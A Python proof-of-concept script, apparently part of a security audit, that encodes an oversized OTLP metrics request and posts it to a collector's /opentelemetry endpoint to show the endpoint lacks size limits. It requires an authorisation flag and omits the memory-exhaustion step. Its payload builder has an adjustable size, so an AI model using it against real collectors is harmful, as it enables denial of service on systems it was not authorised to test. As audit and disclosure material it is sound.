#!/usr/bin/env python3
"""F4 PoC (audit lead C8) — OTLP metric endpoint POST /opentelemetry carries no admission control.

Detection-only and non-destructive: exactly ONE bounded 8 MiB request body
(a size the sibling /v1/traces endpoint rejects at its 4 MiB cap), sent to a
lab target. It asserts the ABSENCE of a size/budget rejection on the metric
path — it never attempts to exhaust a heap. The heap-ceiling/OOM
demonstration was performed only against the researcher's own fixture
process (see ../env/fixture-c8/ and evidence/f4-runtime-differential.txt), never as part of this script.

  PASS: /opentelemetry answers something other than 408/413/503 at 8 MiB
        (the body was accepted and parsed, unbounded)
  CONTROL (optional, --with-control): the same 8 MiB to /v1/traces answers
        413 — proving the release ships a byte cap on the sibling path.

Requires an explicitly authorized lab target (--confirm-authorised).
"""
import argparse
import http.client
import struct
import sys
import urllib.parse


# ---------- minimal OTLP wire encoder (stdlib only) ----------
def varint(n):
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        out.append(b | 0x80 if n else b)
        if not n:
            return bytes(out)


def tag(field, wire):
    return varint((field << 3) | wire)


def lf(field, payload):
    return tag(field, 2) + varint(len(payload)) + payload


def vi(field, n):
    return tag(field, 0) + varint(n)


def fx64(field, val):
    return tag(field, 1) + struct.pack("<d", val)


def kv(key, s):
    return lf(1, key.encode()) + lf(2, lf(1, s.encode()))


def datapoint(i, pad):
    return lf(1, fx64(2, 1730000000000000000 + i) + fx64(3, 1730000000000000000 + i)
              + fx64(4, 0.5) + lf(7, kv("pad", pad)))


def build_metrics_request(target_bytes, datapoints=2000):
    pad = "x" * max(0, (target_bytes - 200) // datapoints)
    dps = b"".join(lf(1, datapoint(i, pad)) for i in range(datapoints))
    dps += vi(2, 2) + vi(3, 0)                      # Sum: cumulative, not monotonic
    metric = lf(1, b"poc.c8") + lf(7, dps)          # Metric{name, sum}
    scope = lf(2, metric)                            # ScopeMetrics{metrics}
    res = lf(1, kv("service.name", "poc-c8-app"))    # Resource{attributes}
    rm = lf(1, res) + lf(2, scope)                   # ResourceMetrics
    return lf(1, rm)                                 # ExportMetricsServiceRequest


def post(url, body):
    u = urllib.parse.urlsplit(url)
    conn = http.client.HTTPConnection(u.hostname, u.port, timeout=120)
    try:
        conn.request("POST", u.path, body=body,
                     headers={"Content-Type": "application/x-protobuf",
                              "Content-Length": str(len(body))})
        r = conn.getresponse()
        r.read()
        return r.status
    finally:
        conn.close()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True, help="collector HTTP base, e.g. http://127.0.0.1:8081")
    ap.add_argument("--confirm-authorised", action="store_true",
                    help="acknowledge the target is a lab you are authorized to test")
    ap.add_argument("--with-control", action="store_true",
                    help="also send the same body to /v1/traces, expecting 413 there")
    ap.add_argument("--size-mib", type=int, default=8)
    args = ap.parse_args()
    if not args.confirm_authorised:
        print("refusing to run: pass --confirm-authorised", file=sys.stderr)
        return 2

    size = args.size_mib * 1024 * 1024
    body = build_metrics_request(size)
    print(f"generated valid ExportMetricsServiceRequest: {len(body)} bytes")

    st = post(args.base + "/opentelemetry", body)
    print(f"POST /opentelemetry ({args.size_mib} MiB) -> {st}")
    failures = []
    if st in (408, 413, 503):
        failures.append(f"metric path DID enforce a bound ({st}) — claim does not reproduce")

    if args.with_control:
        st2 = post(args.base + "/v1/traces", body)
        print(f"POST /v1/traces      ({args.size_mib} MiB) -> {st2}")
        if st2 == 404:
            print("   (control skipped: this deployment has no OTLP trace servlet)")
        elif st2 != 413:
            failures.append(f"sibling control mismatch: expected 413 on /v1/traces, got {st2}")

    if failures:
        for f in failures:
            print("FAIL:", f, file=sys.stderr)
        return 1
    print("OK: metric body accepted with no admission rejection at a size "
          "the sibling endpoint refuses (no destructive step performed)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
